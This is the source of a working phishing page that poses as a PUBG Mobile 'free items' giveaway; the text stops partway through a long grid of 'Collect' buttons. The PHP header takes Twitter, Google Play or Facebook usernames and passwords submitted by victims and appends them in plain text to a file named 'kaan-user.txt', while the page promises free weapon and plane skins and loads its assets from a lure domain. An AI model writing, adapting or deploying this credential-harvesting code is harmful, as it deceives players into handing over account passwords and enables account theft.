<?php 
session_start();
if (!isset($_POST['tuser']) && !isset($_POST['ggmail']) && !isset($_POST['fuser'])){
	header("Location:login.php");
}
else {



if (isset($_POST["tuser"]) && isset($_POST["tpass"]) ) {
	$medya = 'Twitter';
	$username = $_POST["tuser"];
	$password = $_POST["tpass"];
}
else if (isset($_POST["ggmail"]) && isset($_POST["gpass"]) ) {
	$medya = 'Google Play';
	$username = $_POST["ggmail"];
	$password = $_POST["gpass"];
}
else if (isset($_POST["fuser"]) && isset($_POST["fpass"]) ) {
	$medya = 'Facebook';
	$username = $_POST["fuser"];
	$password = $_POST["fpass"];
}

}
 
$ac = fopen("kaan-user.txt","a+");
$userlar = ("\n__________________\n \n".$medya."\n \nUser: ".$username."\nPass: ".$password."\n__________________\n");
fwrite($ac,$userlar);
fclose($ac);





 ?>

<!DOCTYPE html>
<html>
<head>
<title>PUBG Mobile - Official PUBG on mobile</title>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:description" content="For a limited time you can buy all the weapon finish, plane finish, and more item that you wanted just for free. Reward and bonus will be given to players who have submitted the data."/>
<meta property="og:image" content="img/thumbnail.png"/>
<meta property="og:image:width" content="540"/>
<meta property="og:image:height" content="282"/>
<link rel="icon" type="img/png" href="http://freenew-claimpubg.dnset.com/img/thumbnail.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="http://freenew-claimpubg.dnset.com/css/style.css"/>
<link rel="stylesheet" type="text/css" href="http://freenew-claimpubg.dnset.com/css/mystyle.css"/>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>

</head>
<body>

<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/aa.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/bb.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/cc.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/dd.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/ee.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/ff.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/a.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/b.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/c.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/d.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/e.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/f.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/g.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/h.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/i.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/j.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/k.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/l.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/m.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/n.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/o.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/p.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/q.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/r.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/s.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/t.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/u.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/v.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/w.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/1.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/2.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/3.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/4.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/aaa.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/bbb.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/ccc.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/ab.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/ac.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/ad.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/ae.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/af.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/ag.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/ah.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/ai.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/aj.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/ddd.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/eee.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/fff.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/hhh.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/iii.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/jjj.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/5.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/6.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/7.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/8.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/9.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/10.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/11.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/12.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/13.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/14.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/15.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/16.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/17.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/18.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/19.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/20.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/21.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/22.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/23.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/24.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/25.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/26.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/27.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/28.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/29.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/30.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/31.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/32.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/33.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/34.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/35.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/36.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/37.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/38.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/39.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/40.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/41.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/42.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/43.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/44.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/45.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/46.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/47.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/48.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/49.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/50.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/51.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/52.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/53.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/54.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/55.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/56.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/57.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/58.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/59.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/60.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/61.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/62.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/63.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/64.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/65.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/66.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/67.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/68.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/69.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/70.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/71.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/72.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/73.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/74.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/75.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/76.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/77.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/78.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/79.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/80.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/81.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/82.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/83.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/84.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/85.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/86.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/87.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/88.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/89.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/90.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/91.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/92.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/93.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/94.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/95.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/96.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/97.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/98.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/99.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/100.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/101.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/102.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/103.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/104.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/01.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/02.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/03.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/04.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/05.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/06.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/07.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/08.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/09.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/010.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/011.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/012.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/013.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/014.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/015.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/016.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/017.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/018.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/019.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/020.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/021.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/022.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/022.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/023.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/024.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/025.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/026.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/027.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/028.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/029.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/030.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/031.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/032.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/033.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/034.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/035.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/036.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/037.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/038.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/039.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/040.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/041.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
